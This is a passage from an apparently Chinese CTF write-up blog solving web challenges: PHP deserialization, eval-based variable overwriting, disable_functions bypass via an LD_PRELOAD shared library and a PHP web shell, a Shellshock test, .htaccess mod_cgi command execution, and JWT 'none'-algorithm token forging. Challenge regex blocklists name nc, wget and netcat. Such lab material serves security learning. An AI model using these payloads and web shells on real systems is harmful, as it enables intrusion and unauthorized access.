class="hljs-number">1</span>)；<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210623183118168.png"></p><h2 id="BUU-CODE-REVIEW"><a href="#BUU-CODE-REVIEW" class="headerlink" title="BUU CODE REVIEW"></a>BUU CODE REVIEW</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$correct</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-keyword">$this</span>-&gt;correct = base64_encode(uniqid());<br>           <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;correct === <span class="hljs-keyword">$this</span>-&gt;input) &#123;<br>               <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/flag&quot;</span>);<br>           &#125;<br>       &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>       &#125;<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pleaseget&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pleasepost&#x27;</span>] === <span class="hljs-string">&#x27;2&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>]) == md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>]) &#123;<br>            unserialize(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;obj&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先有unserialize参数通过POST变量obj，即参数可控，其次类已经给出，可以利用，最后，类中有魔术方法__destruct 说明这是一道考查了反序列化知识点的题</p><p>题中函数讲解：uniqid()：基于以微秒计的当前时间，生成一个唯一id</p><p>MD5的==比较，可以使用哈希比较缺陷和数组绕过</p><p>条件$this-&gt;correct === $this-&gt;input构造传引用：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$a</span>-&gt;<span class="hljs-variable">$input</span>=<span class="hljs-variable">$a</span>-&gt;<span class="hljs-variable">$correct</span>;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$correct</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-keyword">$this</span>-&gt;correct = base64_encode(uniqid());<br>           <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;correct === <span class="hljs-keyword">$this</span>-&gt;input) &#123;<br>              <span class="hljs-comment">//echo file_get_contents(&quot;/flag&quot;);</span><br>           &#125;<br>       &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>       &#125;<br>   &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> BUU();<br><span class="hljs-variable">$a</span>-&gt;input=&amp;a-&gt;correct;<span class="hljs-comment">//传引用</span><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//得到：O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;s:0:&quot;&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>拼接payload即可</p><h2 id="abcd"><a href="#abcd" class="headerlink" title="abcd"></a>abcd</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">//$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ygnn_bpkn&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ygnn_bpkn.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|show_source|GLOBALS|echo|var_dump|print|highlight_file|GET|eval/i&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">16</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);<br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;lueluelue&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>非预期解：</p><blockquote><p>ygnn_bpkn=1&amp;ygnn[bpkn.COM=2&amp;fun=system($_POST[a])&amp;a=tac flag.php</p><p>ygnn_bpkn=1&amp;ygnn[bpkn.COM=2&amp;fun=system($_POST[a])&amp;a=tac flag2.php</p></blockquote></blockquote><p>题目本意是<code>fl0g=flag_give_me</code>输出flag，很显然<code>fl0g</code>传入的方式是GET，但是要想这样赋值前的if条件又是通过GET传入空值<code>fl0g</code> 总之这就是个死局</p><p>我们可以通过变量覆盖的方式，也是这题的考查点，利用变量c和extract()做跳板，给<code>fl0g</code>类似参数逃逸的方式赋值</p><blockquote><p>extract() 函数从数组中将变量导入到当前的符号表。</p><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><p>该函数返回成功设置的变量数目。</p><p>extract(<strong>array</strong>,extract_rules,prefix)</p></blockquote><blockquote><p>ygnn_bpkn=1&amp;ygnn[bpkn.COM=2&amp;fl0g=flag_give_me&amp;fun=extract($_POST)</p></blockquote><p>然后访问robots.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag2.php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$F</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;F&#x27;</span>])&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/system|nl|tac|tee|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="hljs-variable">$F</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(substr(<span class="hljs-variable">$F</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>));<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;come&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>应是环境问题，解法应该是curl -F，此处<code>?F=\`$F `;vi flag2.php</code>没有响应 尝试了其他命令也是如此</p><p>至此此题解</p><p>值得注意的是<code>$a=$_SERVER[&#39;argv&#39;];</code>被注释了，否则存在解法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>]当前传递给PHP程序的参数<br><span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>][<span class="hljs-number">0</span>];<br>当我们传值 ?<span class="hljs-variable">$fl0g</span>=flag_give_me; (一定要加上分号；)然后此时<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;<span class="hljs-subst">$fl0g</span>=flag_give_me;&quot;</span>并不是直接GET fl0g，<br>在使用<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>])，来执行<span class="hljs-string">&quot;<span class="hljs-subst">$fl0g</span>=flag_give_me;&quot;</span>，达到赋值的目的<br>最后 <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>)<br><br>GET: ?<span class="hljs-variable">$fl0g</span>=flag_give_me;<br>POST: ygnn_bpkn=<span class="hljs-number">1</span>&amp;ygnn[bpkn.COM=<span class="hljs-number">2</span>&amp;fun=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure><h2 id="def"><a href="#def" class="headerlink" title="def"></a>def</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>];<br><span class="hljs-keyword">if</span>(!preg_match_all(<span class="hljs-string">&#x27;/eval|system|usort|array|include|shell_exec|exec|call|function|replace|uasort/i&#x27;</span>,<span class="hljs-variable">$a</span>))<br>&#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/&#x27;</span>,<span class="hljs-variable">$b</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;不要字母&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$f</span> = <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/&#x27;</span>,<span class="hljs-variable">$d</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;都说了不要字母&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>];<br>        <span class="hljs-variable">$g</span> = <span class="hljs-variable">$f</span>(<span class="hljs-variable">$e</span>(<span class="hljs-variable">$d</span>));<br>        <span class="hljs-variable">$caicai</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;caicai&#x27;</span>];<br>        <span class="hljs-variable">$cc</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cc&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/abc|def|caicai|cc/&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;h&#x27;</span>]))<br>        &#123;<br>            <span class="hljs-variable">$h</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;h&#x27;</span>].<span class="hljs-string">&#x27;;&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;不要使用敏感函数&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>base_convert(<strong>number,frombase,tobase</strong>);在任意进制之间转换数字</p></blockquote><p>先说非预期解：扫目录发现<code>.DS_Store</code>，工具解开发现<code>flagaaaaaaaaaa.txt</code>，访问即可</p><h2 id="Bypass-disable-function-——-LD-PRELOAD"><a href="#Bypass-disable-function-——-LD-PRELOAD" class="headerlink" title="Bypass disable_function —— LD_PRELOAD"></a>Bypass disable_function —— LD_PRELOAD</h2><p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<br>system(<span class="hljs-string">&quot;cat /flag &gt;&gt; /var/www/html/test.php&quot;</span>);<br>system(<span class="hljs-string">&quot;tac /flag &gt;&gt; /var/www/html/test.php&quot;</span>);<br>system(<span class="hljs-string">&quot;/readflag &gt;&gt; /var/www/html/test.php&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span>  <span class="hljs-title">geteuid</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    payload();<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>gcc -c -fPIC hack.c -o hack<br>gcc -shared hack -o hack.so</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;ant&#x27;</span>]);<br>  putenv(<span class="hljs-string">&quot;LD_PRELOAD=/tmp/hack.so&quot;</span>);<br>  error_log(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-number">1</span>);<br>  mail(<span class="hljs-string">&quot;admin@localhost&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>putenv()用来改变或增加环境变量的内容. 参数string 的格式为name＝value, 如果该环境变量原先存在, 则变量内容会依参数string 改变, 否则此参数内容会成为新的环境变量.</p></blockquote><p>浏览器访问shell.php，再访问test.php,即可发现flag</p><p>利用蚁剑插件可以免去上述过程 如下题：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729142924840.png"></p><p>蚁剑连接</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729143019466.png"></p><p>直接查看flag文件为空 下载文件得到没权限</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729143920521.png"></p><p>终端始终返回127 这是运行环境和登录用户的运行环境存在差异造成的 这样设置就是权限不够</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729143100697.png"></p><p>在蚁剑使用插件绕过disable_function，成功后可以看到 <code>/var/www/html/</code> 目录下新建了一个 <code>.antproxy.php</code> 文件</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729154051090.png"></p><p>改用.antproxy.php连接蚁剑 即可绕过</p><h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p>ShellShock,破壳漏洞，出现于2014年<br>可以通过以下命令来判断是否存在这个漏洞<br><code>env x=&#39;() &#123; :;&#125;; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;</code><br>如果出现vulnerable说明存在</p><h2 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h2><p>需要用到.htaccess和mod_cgi</p><p>1）.htaccess</p><p>一般情况下，不应该使用.htaccess文件，除非你对主配置文件没有访问权限；.htaccess文件应该被用在内容提供者需要针对特定目录改变服务器的配置而又没有root权限的情况下。如果服务器管理员不愿意频繁修改配置，则可以允许用户通过.htaccess文件自己修改配置，尤其是ISP在同一个机器上运行了多个用户站点，而又希望用户可以自己改变配置的情况下。</p><p>2）mod_cgi</p><p>在非线程型MPM(<code>prefork</code>)上提供对CGI脚本执行的支持</p><p>任何具有MIME类型<code>application/x-httpd-cgi</code>或者被<code>cgi-script</code>处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由<code>AddType</code>指令定义的扩展名，另一种是文件位于<code>ScriptAlias</code>目录中。如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令</p><p>需要满足几个条件:</p><p>第一，必须是apache环境<br>第二，mod_cgi已经启用<br>第三，必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none<br>第四，必须有权限写.htaccess文件</p><p>.htaccess内容：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">Options +ExecCGI<br>AddHandler cgi-script <span class="hljs-string">.abc</span><span class="hljs-comment">#这里的.abc是构造的，表示.abc后缀的文件都会被当作cgi脚本执行</span><br><br>shell.abc<br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-keyword">echo</span>&amp;&amp;<span class="hljs-keyword">cd</span> <span class="hljs-string">&quot;/var/www/html&quot;</span>;<span class="hljs-keyword">ls</span> -al;<span class="hljs-keyword">echo</span> [S];<span class="hljs-keyword">pwd</span>;<span class="hljs-keyword">echo</span> [E]<br></code></pre></td></tr></table></figure><p>注解：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Options</span>指令是Apache配置文件中一个比较常见也比较重要的指令，<span class="hljs-keyword">Options</span>指令可以在Apache服务器核心配置(<span class="hljs-keyword">server</span> config)、虚拟主机配置(virtual host)、特定目录配置(directory)以及.htaccess文件中使用。<span class="hljs-keyword">Options</span>指令的主要作用是控制特定目录将启用哪些服务器特性。<br>关于<span class="hljs-keyword">Options</span>指令后可以附加的特性选项的具体作用及含义，可以参考这篇文章：http://www<span class="hljs-number">.365</span>mini.com/page/apache-<span class="hljs-keyword">options</span>-directive.htm<br>当然我们用到的就是ExecCGI选项，表示允许使用mod_cgi模块执行CGI脚本<br></code></pre></td></tr></table></figure><p>利用蚁剑的插件即可</p><h2 id="JSON-Web-Token"><a href="#JSON-Web-Token" class="headerlink" title="JSON Web Token"></a>JSON Web Token</h2><h3 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h3><p>一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。尝试找到 flag。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819003224592.png"></p><p>抓包得到：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">token</span>=eyJ<span class="hljs-number">0</span>eXAiOiJKV<span class="hljs-number">1</span>QiLCJhbGciOiJIUzI<span class="hljs-number">1</span>NiJ<span class="hljs-number">9</span>.eyJ<span class="hljs-number">1</span>c<span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>IjEyMyIsInBhc<span class="hljs-number">3</span>N<span class="hljs-number">3</span>b<span class="hljs-number">3</span>JkIjoiMTIzIiwicm<span class="hljs-number">9</span>sZSI<span class="hljs-number">6</span>Imd<span class="hljs-number">1</span>ZXN<span class="hljs-number">0</span>In<span class="hljs-number">0</span>.<span class="hljs-number">1</span>HzZE_bkrgzE<span class="hljs-number">12</span>m<span class="hljs-number">27</span>Odw_bKZvGA<span class="hljs-number">4</span>ytwP<span class="hljs-number">3</span>mLXvYIsQrk<br></code></pre></td></tr></table></figure><p>可以分段base64也可以使用<a href="https://jwt.io/">https://jwt.io/</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819003915180.png"></p><p>最后面的<strong>VERIFY SIGNATURE</strong>修改无法解出来，因为设置了签证为空，删除即可，直接将第二个点前的数据进行解码</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819004041753.png"></p><p>经验，给补上一个<code>=</code></p><p>将<code>alg</code>设置为<code>none</code>，将<code>role</code>设置为<code>admin</code></p><p>得到payload：</p><blockquote><p>token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6IjEyMyIsInBhc3N3b3JkIjoiMTIzIiwicm9sZSI6ImFkbWluIn0.</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819011534028.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819011621792.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819011635058.png"></p><h3 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819012520913.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819013136910.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819013309069.png"></p><h3 id="非对称RS256私钥生成jwt"><a href="#非对称RS256私钥生成jwt" class="headerlink" title="非对称RS256私钥生成jwt"></a>非对称RS256私钥生成jwt</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/* GET home page. */</span><br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> privateKey = fs.readFileSync(process.cwd() + <span class="hljs-string">&#x27;//public//private.key&#x27;</span>)<br>  <span class="hljs-keyword">var</span> token = jwt.sign(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;)<br>  res.cookie(<span class="hljs-string">&#x27;auth&#x27;</span>, token)<br>  res.end(<span class="hljs-string">&#x27;where is flag?&#x27;</span>)<br>&#125;)<br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span><br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> auth = req.cookies.auth<br>  <span class="hljs-keyword">var</span> cert = fs.readFileSync(process.cwd() + <span class="hljs-string">&#x27;//public/public.key&#x27;</span>) <span class="hljs-comment">// get public key</span><br>  jwt.verify(auth, cert, <span class="hljs-function"><span 